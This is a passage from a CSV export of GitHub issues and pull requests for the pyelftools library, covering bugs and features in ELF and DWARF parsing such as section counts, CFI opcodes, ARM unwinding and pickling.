So far, the implementation of `elffile.num_sections()` didn't handle these situations and simply reported that the file contained 0 sections, and `scripts/readelf.py` presented invalid values.

Fix it by following the specification more closely and showing the corresponding correct values in `readelf.py`.

The test file included is the smallest one I could generate but it still takes up 4.7 MB.

Fixes: #330 

[link]: https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/333/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/333/comments,https://api.github.com/repos/eliben/pyelftools/issues/333/events,https://github.com/eliben/pyelftools/pull/333,https://api.github.com/repos/eliben/pyelftools/pulls/333
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/332,712070609,MDExOlB1bGxSZXF1ZXN0NDk1NjEzMDg5,332,Update README.rst,69411775,closed,FALSE,NA,NA,0,2020-09-30T15:55:23Z,2020-09-30T21:15:23Z,2020-09-30T21:15:23Z,NONE,NA,use windows powersell to install modules.,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/332/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/332/comments,https://api.github.com/repos/eliben/pyelftools/issues/332/events,https://github.com/eliben/pyelftools/pull/332,https://api.github.com/repos/eliben/pyelftools/pulls/332
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/331,706626842,MDExOlB1bGxSZXF1ZXN0NDkxMTQwMzMx,331,added a method for returning the index of a section by name,50236903,closed,FALSE,NA,NA,9,2020-09-22T19:12:11Z,2020-12-07T16:36:48Z,2020-12-07T16:36:48Z,CONTRIBUTOR,NA,"Moved section to map to another function
Created an method to return section index by section name
Signed-off-by: Jonathan <yonbruchim@gmail.com>",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/331/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/331/comments,https://api.github.com/repos/eliben/pyelftools/issues/331/events,https://github.com/eliben/pyelftools/pull/331,https://api.github.com/repos/eliben/pyelftools/pulls/331
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/330,678303931,MDU6SXNzdWU2NzgzMDM5MzE=,330,Incorrect handling of ELF files with large numbers of sections,701977,closed,FALSE,NA,NA,1,2020-08-13T09:45:14Z,2020-10-01T13:45:20Z,2020-10-01T13:45:20Z,NONE,NA,"According to `man(5) elf`:

```
       e_shnum
              ...
              If the number of entries in the section header table is larger
              than or equal to SHN_LORESERVE (0xff00), e_shnum holds the
              value zero and the real number of entries in the section
              header table is held in the sh_size member of the initial
              entry in section header table.

       e_shstrndx
              ...
              If the index of section name string table section is larger
              than or equal to SHN_LORESERVE (0xff00), this member holds
              SHN_XINDEX (0xffff) and the real index of the section name
              string table section is held in the sh_link member of the ini‐
              tial entry in section header table.
```

pyelftools implements neither of the above cases, and as a result, for ELF files with large numbers of sections, `elffile.num_sections()` returns `0`, and the names of sections obtained via `elffile.get_section(i)`are incorrect.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/330/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/330/comments,https://api.github.com/repos/eliben/pyelftools/issues/330/events,https://github.com/eliben/pyelftools/issues/330,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/329,665140773,MDU6SXNzdWU2NjUxNDA3NzM=,329,Offset issue parsing child by iter_DIE_children,68738994,closed,FALSE,NA,NA,3,2020-07-24T12:38:58Z,2020-07-24T15:42:01Z,2020-07-24T15:42:01Z,NONE,NA,"I got an error in ""iter_DIE_children"" in one of my ELF when parsing a compilation UNIT. The error is on the offset of DW_AT_sibling of one of the child (DW_TAG_lexical_block in the example but can be other DIE type but not all DIE).

I got this when cur_offset is computed in ""iter_DIE_children"" as ""DW_AT_sibling"" exist (cur_offset = sibling.value + self.cu_offset):

DIE DW_TAG_lexical_block, size=13, has_children=True
    |DW_AT_sibling     :  AttributeValue(name='DW_AT_sibling', form='DW_FORM_ref_addr', value=970, raw_value=970, offset=939)

==> In above exemple when we look at the sibling, we see: 
- value=970
- offset=939
And so cur_offset is computed to 970 + 939 but this is an error here as the offset of sibling is in fact 970 (no need to make the addition). But on other DIE the addition need to be done to retrieve the offset.

It seems that I got:
- some die where cur_offset shall be equal to sibling.value
- some other die where cur_offset shall be equal to sibling.value + self.cu_offset

Here I don't know if the issue is in the ELF or in pyelftools itself ? After for the ELF, I use a commercial compiler/linker so I think DWARF information should be correct.
I extract the DWARF by using objdump and on this DIE, the offset are correct.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/329/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/329/comments,https://api.github.com/repos/eliben/pyelftools/issues/329/events,https://github.com/eliben/pyelftools/issues/329,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/328,664896814,MDExOlB1bGxSZXF1ZXN0NDU2MDU5NTg2,328,Add support for ARM exception handler ABI,9478918,closed,FALSE,NA,NA,4,2020-07-24T03:48:22Z,2020-08-19T16:35:13Z,2020-08-19T16:35:13Z,CONTRIBUTOR,NA,"Dwarf and ehabi are two different unwind model. ARM ELF file use `.ARM.exidx` and `.ARM.extab` secions to unwind stack trace. The description of data can be shown with command binutils `readelf -u filename`. Pyelftools doesn't parse these two sections, which is reason for this pull request.

Like `DWARFInfo`, `EHABIInfo` is also independent with `ELFFile`. It just need initialized by a `SHT_ARM_EXIDX` section.

Also I add argument `-au`, `--arm_unwind` in `readelf.py`. I cannot use `-u` because this pull request only compatible for ARM.

Referense:
https://github.com/llvm/llvm-project/blob/master/llvm/tools/llvm-readobj/ARMEHABIPrinter.h
https://developer.arm.com/documentation/ihi0038/b/
binutils: readelf.c",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/328/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/328/comments,https://api.github.com/repos/eliben/pyelftools/issues/328/events,https://github.com/eliben/pyelftools/pull/328,https://api.github.com/repos/eliben/pyelftools/pulls/328
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/327,663954596,MDExOlB1bGxSZXF1ZXN0NDU1Mjc2MzEw,327,Update code to work with pickling,9255838,closed,FALSE,NA,NA,1,2020-07-22T18:13:14Z,2020-07-25T12:22:18Z,2020-07-25T12:22:11Z,CONTRIBUTOR,NA,"When pickling objects using the ""dill"" package, the pickler does not know how to handle singletons and will throw an error. The __reduce__ method I added on 1300 tells the pickler how to handle the object's serialization. After I was able to pickle the object, I noticed that I was having a few issues with unpickling. It seemed as if there might have been a small issue with how the parameters were being passed in on line 348. The error message said it required two arguments, not one. By adding the self argument, it managed to fix the problems. ",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/327/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/327/comments,https://api.github.com/repos/eliben/pyelftools/issues/327/events,https://github.com/eliben/pyelftools/pull/327,https://api.github.com/repos/eliben/pyelftools/pulls/327
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/326,656174625,MDExOlB1bGxSZXF1ZXN0NDQ4NTIwMzM3,326,Return the correct number of program headers when e_phnum is 0xffff,9197985,closed,FALSE,NA,NA,2,2020-07-13T22:02:38Z,2020-07-20T21:21:50Z,2020-07-20T21:21:50Z,CONTRIBUTOR,NA,"While using pyelftools to parse a QEMU memory dump (ELF corefile), I noticed that pyelftools returned only the first 65535 program headers, while readelf returned 65843. 
Per specification:
""If the number of program headers is greater than or equal to PN_XNUM (0xffff), this member has the value PN_XNUM (0xffff). The actual number of program header table entries is contained in the sh_info field of the section header at index 0.""

This PR should implement this behaviour and fix the problem.

In case you want to test the code, [here](https://github.com/eliben/pyelftools/files/4915397/sample0.min.gz) you can find the corefile! 



",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/326/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/326/comments,https://api.github.com/repos/eliben/pyelftools/issues/326/events,https://github.com/eliben/pyelftools/pull/326,https://api.github.com/repos/eliben/pyelftools/pulls/326
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/325,655855089,MDU6SXNzdWU2NTU4NTUwODk=,325,Add support for DWARF version 5,2047957,open,FALSE,NA,NA,2,2020-07-13T13:31:53Z,2020-09-09T20:50:49Z,NA,CONTRIBUTOR,NA,"pyelftools still doesn't support DWARF version 5 as seen [here](https://github.com/eliben/pyelftools/blob/master/elftools/dwarf/dwarfinfo.py#L434). Is there anything considerable to be done except changing those lines and adding the new `DW_TAG` and `DW_AT`? If no work as been done, I might give it a try as I need some DWARF version 5 information.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/325/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/325/comments,https://api.github.com/repos/eliben/pyelftools/issues/325/events,https://github.com/eliben/pyelftools/issues/325,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/324,652718612,MDExOlB1bGxSZXF1ZXN0NDQ1NzQ1OTU2,324,Fix the non-determinism in test_dwarf_expr.,5071575,closed,FALSE,NA,NA,2,2020-07-07T22:59:42Z,2020-07-08T00:42:58Z,2020-07-08T00:42:34Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/324/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/324/comments,https://api.github.com/repos/eliben/pyelftools/issues/324/events,https://github.com/eliben/pyelftools/pull/324,https://api.github.com/repos/eliben/pyelftools/pulls/324
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/323,652642536,MDExOlB1bGxSZXF1ZXN0NDQ1Njc4NTU5,323,Fix Python 2 support of FDE.,5071575,closed,FALSE,NA,NA,3,2020-07-07T21:03:11Z,2020-07-08T00:05:01Z,2020-07-08T00:05:01Z,CONTRIBUTOR,NA,My previous PR (#308) broke Python 2 support by omitting arguments to `super()`. This commit fixes it.,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/323/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/323/comments,https://api.github.com/repos/eliben/pyelftools/issues/323/events,https://github.com/eliben/pyelftools/pull/323,https://api.github.com/repos/eliben/pyelftools/pulls/323
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/322,650961515,MDU6SXNzdWU2NTA5NjE1MTU=,322,Is it possible to see what other functions a given function calls? With ARM or PowerPC architectures?,32044610,open,FALSE,NA,NA,1,2020-07-04T21:51:53Z,2020-07-05T12:04:54Z,NA,NONE,NA,"Given an ELF file, is it possible using elftools to create a graph of how the code is layed out? Say I have the following:
```c
void bar1(void)
{
    return;
}

void bar2(void)
{
    bar1();
    return;
}

void foo(void)
{
    bar1();
    bar2();
    return;
}
```
Such that I can generate a graph where node `foo` has 2 children, `bar1` and `bar2`. And then `bar2` has 1 child, `bar1`. Then `bar1` has no children since it does not call anything. I am essentially wondering is given a compile unit, for each function, can I get the list of what other functions that function calls? I know it is possible to infer this from raw text parsing the disassembly, but thats not the best way to do it.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/322/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/322/comments,https://api.github.com/repos/eliben/pyelftools/issues/322/events,https://github.com/eliben/pyelftools/issues/322,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/321,641403558,MDExOlB1bGxSZXF1ZXN0NDM2NjQwNjIx,321,Fix typo when referencing DW_FORM_ref_addr,2047957,closed,FALSE,NA,NA,2,2020-06-18T17:07:30Z,2020-07-08T00:07:01Z,2020-07-08T00:07:01Z,CONTRIBUTOR,NA,Found a quick typo when I was trying to resolve DIEs coming from a `DW_AT_abstract_origin` reference.,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/321/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/321/comments,https://api.github.com/repos/eliben/pyelftools/issues/321/events,https://github.com/eliben/pyelftools/pull/321,https://api.github.com/repos/eliben/pyelftools/pulls/321
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/320,634743126,MDU6SXNzdWU2MzQ3NDMxMjY=,320,Unknown CFI opcode,10161265,closed,FALSE,NA,NA,1,2020-06-08T16:01:00Z,2020-06-08T16:58:07Z,2020-06-08T16:58:07Z,NONE,NA,"I want to parse ""eh_frame"" section by elftools, but I got below error:

```
Unknown CFI opcode: 0x2e
```

My code to parse `eh_frame` is shown as below:

```python
 with open(binary, 'rb') as elf_binary:
        elf = ELFFile(elf_binary)
        dwarf_sec = elf.get_dwarf_info()

        if not dwarf_sec.has_EH_CFI():
            return

        try:
            for entry in dwarf_sec.EH_CFI_entries():

                if not isinstance(entry, ZERO):
                    # do something
        except elftools.common.exceptions.DWARFError as ex:
            logging.error(""Decodding error! %s "" % str(ex))
```

The binary file is attached.
[ld.gold.strip.zip](https://github.com/eliben/pyelftools/files/4747121/ld.gold.strip.zip)
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/320/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/320/comments,https://api.github.com/repos/eliben/pyelftools/issues/320/events,https://github.com/eliben/pyelftools/issues/320,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/319,633495543,MDExOlB1bGxSZXF1ZXN0NDMwMTM5Mzkx,319,Add PT_GNU_PROPERTY enum,10009354,closed,FALSE,NA,NA,1,2020-06-07T15:12:04Z,2020-06-08T12:37:28Z,2020-06-08T12:14:38Z,CONTRIBUTOR,NA,"This commit adds the missing `PT_GNU_PROPERTY` program header enum.

Additional information regarding the `PT_GNU_PROPERTY` can be found at:
* https://reviews.llvm.org/D70959
* https://github.com/hjl-tools/linux-abi/wiki/linux-abi-draft.pdf (linked in above url)
* https://sourceware.org/pipermail/libc-alpha/2020-May/113841.html (commit in libc adding this value)

This program header can be found, e.g., in a glibc in Ubuntu 20.04 (see `docker run --rm -it ubuntu:20.04 cat /usr/lib/x86_64-linux-gnu/libc-2.31.so > libc-2.31.so`).",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/319/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/319/comments,https://api.github.com/repos/eliben/pyelftools/issues/319/events,https://github.com/eliben/pyelftools/pull/319,https://api.github.com/repos/eliben/pyelftools/pulls/319
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/318,632100924,MDExOlB1bGxSZXF1ZXN0NDI4ODg3NzA2,318,initial readelf support for aarch64 little endian,1823839,closed,FALSE,NA,NA,3,2020-06-06T00:50:18Z,2020-06-09T18:07:49Z,2020-06-09T12:53:09Z,CONTRIBUTOR,NA,"See also:
https://static.docs.arm.com/ihi0056/b/IHI0056B_aaelf64.pdf
for relocation types and
https://developer.arm.com/docs/ihi0057/c/dwarf-for-the-arm-64-bit-architecture-aarch64-abi-2018q4
for DWARF register names.

TODO:
1. add more register names; there are 128 in total
2. add more relocation types; works for the test case added but I haven't checked a full kernel image yet.
3. big endian support.

I figured this is a good start though.


Issue #317
Link: https://github.com/ClangBuiltLinux/frame-larger-than/issues/4
Signed-off-by: Nick Desaulniers <ndesaulniers@google.com>",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/318/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/318/comments,https://api.github.com/repos/eliben/pyelftools/issues/318/events,https://github.com/eliben/pyelftools/pull/318,https://api.github.com/repos/eliben/pyelftools/pulls/318
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/317,631899507,MDU6SXNzdWU2MzE4OTk1MDc=,317,aarch64 and ppc64 support?,1823839,open,FALSE,NA,NA,14,2020-06-05T19:51:22Z,2020-07-30T03:42:29Z,NA,CONTRIBUTOR,NA,"Hi @eliben !
I wrote [a utility to help debug](https://github.com/ClangBuiltLinux/frame-larger-than) `-Wframe-larger-than=` warnings (which are pretty unhelpful in telling you what particular variables may be causing this, especially when many child calls have been inlined.  Apparently all of that info about local variables in captured in the debug info).

We used it for debugging a warning for a ppc64 Linux kernel build, but it seemed the object file failed to parse.  We [observed](https://groups.google.com/g/clang-built-linux/c/GjVJqQMvjvg/m/45gaOrW0AAAJ) the thrown ElfError: `Unsupported relocation type: 1`.

I haven't dug into reproducing yet, but I wanted to check first if pyelftools supports ppc64? I'm not sure if ppc64 uses a different target triple for endianess or not.  I also haven't dumped the relocation kinds, which may be helpful for this report.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/317/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/317/comments,https://api.github.com/repos/eliben/pyelftools/issues/317/events,https://github.com/eliben/pyelftools/issues/317,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/316,627852350,MDU6SXNzdWU2Mjc4NTIzNTA=,316,Question about editing ELF DWARF section,8097140,closed,FALSE,NA,NA,1,2020-05-31T00:05:07Z,2020-06-01T13:01:43Z,2020-06-01T13:01:42Z,NONE,NA,"Is there any plan to support editing the dwarf information similar to what `debugedit` does? 

If not what would be required to achieve that?

Are there any other libraries (in any language) that you are aware of that allow editing of source path information of ELF/DWARF files?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/316/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/316/comments,https://api.github.com/repos/eliben/pyelftools/issues/316/events,https://github.com/eliben/pyelftools/issues/316,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/315,622570224,MDExOlB1bGxSZXF1ZXN0NDIxNDEwNDM1,315,dwarf/dwarf_expr: Add support for DW_OP_GNU_push_tls_address,3059210,closed,FALSE,NA,NA,4,2020-05-21T15:13:45Z,2020-06-01T14:17:31Z,2020-06-01T13:00:01Z,CONTRIBUTOR,NA,"Adds support for `DW_OP_GNU_push_tls_address` to the DWARF expression parser.

`DW_OP_form_tls_address` uses `0xe0` (the same as `DW_OP_lo_user`, annoyingly) and has nearly identical semantics to the DWARFv3+ `DW_OP_form_tls_address`. Despite this, it looks like clang prefers to emit `DW_OP_form_tls_address` in some cases, probably because `gdb` has historically had better support for it.

Also fixes the operand decoding of `DW_OP_const8{u,s}`, which was incorrectly using two 32-bit operands instead of a single 64-bit operand (ref: DWARFv4 2.5.1.1).
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/315/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/315/comments,https://api.github.com/repos/eliben/pyelftools/issues/315/events,https://github.com/eliben/pyelftools/pull/315,https://api.github.com/repos/eliben/pyelftools/pulls/315
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/314,622440046,MDExOlB1bGxSZXF1ZXN0NDIxMzA0MDI4,314,Fix determining PAGESIZE under Jython,662616,closed,FALSE,NA,NA,1,2020-05-21T11:34:54Z,2020-05-21T12:18:18Z,2020-05-21T12:18:18Z,CONTRIBUTOR,NA,"Jython has neither `resource` nor `mmap`, therefore just use a
reasonable default.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/314/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/314/comments,https://api.github.com/repos/eliben/pyelftools/issues/314/events,https://github.com/eliben/pyelftools/pull/314,https://api.github.com/repos/eliben/pyelftools/pulls/314
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/313,619521855,MDU6SXNzdWU2MTk1MjE4NTU=,313,Add ability to see View in LineProgramEntry or LineState,19629185,open,FALSE,NA,NA,0,2020-05-16T17:37:38Z,2020-05-16T17:37:38Z,NA,NONE,NA,"I was trying to diagnose why I was getting 3 different line numbers for the same address and found out they were different views. Still trying to learn about what these views are but thought it was worthy to point out. Here is some output from objdump:

```
File name                            Line number    Starting address    View
file.C                                       162            0x5157a0
file.C                                       164            0x5157a0       1
file.C                                       174            0x5157a0       2
```
The view column was added in dwarf.c in commit https://sourceware.org/git/?p=binutils-gdb.git;a=commit;h=ba8826a82a29a19b78c18ce4f44fe313de279af7

And pyelftools shows the following:
```
LineProgramEntry(command=1, is_extended=False, args=[], state=<LineState 1102f8a10:
  address = 0x5157a0
  file = 1
  line = 162
  column = 12
  is_stmt = 1
  basic_block = False
  end_sequence = False
  prologue_end = False
  epilogue_begin = False
  isa = 0>
)

LineProgramEntry(command=20, is_extended=False, args=[2, 0, 0], state=<LineState 1102f8a50:
  address = 0x5157a0
  file = 1
  line = 164
  column = 9
  is_stmt = 1
  basic_block = False
  end_sequence = False
  prologue_end = False
  epilogue_begin = False
  isa = 0>
)

LineProgramEntry(command=1, is_extended=False, args=[], state=<LineState 1102f8a90:
  address = 0x5157a0
  file = 1
  line = 174
  column = 9
  is_stmt = 1
  basic_block = False
  end_sequence = False
  prologue_end = False
  epilogue_begin = False
  isa = 0>
)
```
From what I see there isn't a way to determine view number from pyelftools. Not sure if they will always show up in ascending order though and can decipher that way, but interested in getting opinions on it.

",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/313/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/313/comments,https://api.github.com/repos/eliben/pyelftools/issues/313/events,https://github.com/eliben/pyelftools/issues/313,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/312,619100343,MDU6SXNzdWU2MTkxMDAzNDM=,312,Parallelism and pickle errors,40723202,open,FALSE,NA,NA,3,2020-05-15T16:34:27Z,2020-05-21T12:15:50Z,NA,NONE,NA,"I tried to speed up parsing by using ProcessPoolExecutor:

```
import concurrent.futures
from elftools.elf.elffile import ELFFile

elf_name = ""examples/sample_exe64.elf""

def parse_DIEs_in_CU(CU_offset):
    with open(elf_name, 'rb') as f:
        elffile = ELFFile(f)
        dwarfinfo = elffile.get_dwarf_info()
        CU = dwarfinfo._parse_CU_at_offset(CU_offset)
        return [DIE for DIE in CU.iter_DIEs()]

def main():
    with open(elf_name, 'rb') as f:
        elffile = ELFFile(f)
        dwarfinfo = elffile.get_dwarf_info()
        CU_offsets = [CU.cu_offset for CU in dwarfinfo.iter_CUs()]
        with concurrent.futures.ProcessPoolExecutor() as executor:
            DIEs = list(executor.map(parse_DIEs_in_CU, CU_offsets))
            print(DIEs)

if __name__ == '__main__':
    main()
```

but got errors like

```
AttributeError: Can't pickle local object 'DWARFStructs._create_initial_length.<locals>._InitialLength'
```

Is it feasible to make pyelftools pickle-friendly?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/312/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/312/comments,https://api.github.com/repos/eliben/pyelftools/issues/312/events,https://github.com/eliben/pyelftools/issues/312,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/311,615413512,MDU6SXNzdWU2MTU0MTM1MTI=,311,[BUG] [DWARF] Missing Compile Units,10477734,open,FALSE,NA,NA,3,2020-05-10T15:18:07Z,2020-07-31T12:46:10Z,NA,NONE,NA,"I'm using the latest git version of pyelftools with python 3.8.

`pyelftools` misses CUs that `objdump` can display when dumping DWARF info from MUSL libc.

The ELF64 binary I'm analyzing can be found [here](https://transfer.sh/Ai5XH/libc.so).

If I iterate through all the CUs using `dwarf_info.iter_CUs()` `pyelftools` misses all CUs from offset `0x66c71` and above.

Trying to specify the CU explicitly returns: 
```
In [3]: dwarf_info.get_CU_at(0x66c71)                      
---------------------------------------------------------------------------
DWARFError                                Traceback (most recent call last)
~/abc/src/classes/dwarf.py in <module>
----> 1 dwarf_info.get_CU_at(0x66c71)

/usr/local/lib/python3.8/dist-packages/pyelftools-0.26-py3.8.egg/elftools/dwarf/dwarfinfo.py in get_CU_at(self, offset)
    191             self.has_debug_info,
    192             'CU lookup but no debug info section')
--> 193         dwarf_assert(
    194             0 <= offset < self.debug_info_sec.size,
    195             ""offset %s beyond .debug_info size"" % offset)

/usr/local/lib/python3.8/dist-packages/pyelftools-0.26-py3.8.egg/elftools/common/utils.py in dwarf_assert(cond, msg)
     81     """""" Assert that cond is True, otherwise raise DWARFError(msg)
     82     """"""
---> 83     _assert_with_exception(cond, msg, DWARFError)
     84 
     85 

/usr/local/lib/python3.8/dist-packages/pyelftools-0.26-py3.8.egg/elftools/common/utils.py in _assert_with_exception(cond, msg, exception_type)
    112 def _assert_with_exception(cond, msg, exception_type):
    113     if not cond:
--> 114         raise exception_type(msg)

DWARFError: offset 420977 beyond .debug_info size
```

Dumping DWARF info with `objdump --dwarf` produces the following excert:

```
...
<1><66c70>: Abbrev Number: 0
  Compilation Unit @ offset 0x66c71:
   Length:        0x33d (32-bit)
   Version:       4
   Abbrev Offset: 0x272a1
   Pointer Size:  8
 <0><66c7c>: Abbrev Number: 1 (DW_TAG_compile_unit)
    <66c7d>   DW_AT_producer    : (indirect string, offset: 0x243): GNU C99 7.3.0 -mtune=generic -march=x86-64 -g -g -O2 -std=c99 -ffreestanding -fexcess-precision=standard -frounding-math -fno-unwind-tables -fno-asynchronous-unwind-tables -ffunction-sections -fdata-sections -fstack-protector-strong -fPIC
    <66c81>   DW_AT_language    : 12    (ANSI C99)
    <66c82>   DW_AT_name        : (indirect string, offset: 0x6f1d): src/network/connect.c
    <66c86>   DW_AT_comp_dir    : .
    <66c88>   DW_AT_ranges      : 0xa100
    <66c8c>   DW_AT_low_pc      : 0x0
    <66c94>   DW_AT_stmt_list   : 0x1e256
 <1><66c98>: Abbrev Number: 2 (DW_TAG_typedef)
...
```",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/311/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/311/comments,https://api.github.com/repos/eliben/pyelftools/issues/311/events,https://github.com/eliben/pyelftools/issues/311,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/310,611427031,MDExOlB1bGxSZXF1ZXN0NDEyNjExNTUz,310,fix issue in aranges cu_offset_at_addr,10776658,closed,FALSE,NA,NA,2,2020-05-03T14:32:59Z,2020-05-23T15:29:14Z,2020-05-23T14:49:29Z,CONTRIBUTOR,NA,"if there are aranges for some parts of the binary but not others, incorrect aranges may be returned
I'm not confident in the inclusive-end check, please review carefully :smile: ",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/310/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/310/comments,https://api.github.com/repos/eliben/pyelftools/issues/310/events,https://github.com/eliben/pyelftools/pull/310,https://api.github.com/repos/eliben/pyelftools/pulls/310
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/309,606957218,MDExOlB1bGxSZXF1ZXN0NDA5MDQ0Mjc0,309,Fix a typo in adapters.py,12756867,closed,FALSE,NA,NA,0,2020-04-26T08:44:45Z,2020-04-27T13:43:04Z,2020-04-27T13:43:04Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/309/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/309/comments,https://api.github.com/repos/eliben/pyelftools/issues/309/events,https://github.com/eliben/pyelftools/pull/309,https://api.github.com/repos/eliben/pyelftools/pulls/309
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/308,600861803,MDExOlB1bGxSZXF1ZXN0NDA0MjEwMDEz,308,dwarf.CallFrameInfo: Support parsing LSDA pointers from FDEs.,5071575,closed,FALSE,5071575,NA,6,2020-04-16T08:49:43Z,2020-07-07T20:49:30Z,2020-07-07T13:07:13Z,CONTRIBUTOR,NA,Add support in dwarf.CallFrameInfo to retrieve LSDA pointers for FDEs.,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/308/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/308/comments,https://api.github.com/repos/eliben/pyelftools/issues/308/events,https://github.com/eliben/pyelftools/pull/308,https://api.github.com/repos/eliben/pyelftools/pulls/308
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/307,597434957,MDExOlB1bGxSZXF1ZXN0NDAxNTQ4OTM3,307,A few additonal changes,16150300,open,FALSE,NA,NA,3,2020-04-09T17:20:57Z,2020-07-08T00:07:33Z,NA,CONTRIBUTOR,NA,"Here are 4 additional commits on top of #265 .  The would likely work  against #264 .
* There are only 16 sizes reserved
* Cache the dwarf structs by arg key
-- Avoid generating the same set of struct parsers over and over - two for every CU
-- Saves 2.5% runtime on the full unit tests (ELF and DWARF) so even more for DWARF
* A commit that probably should be part of #264 to use that infrastructure in descriptions.py
* An optional commit that removes an unnecessary assignment.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/307/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/307/comments,https://api.github.com/repos/eliben/pyelftools/issues/307/events,https://github.com/eliben/pyelftools/pull/307,https://api.github.com/repos/eliben/pyelftools/pulls/307
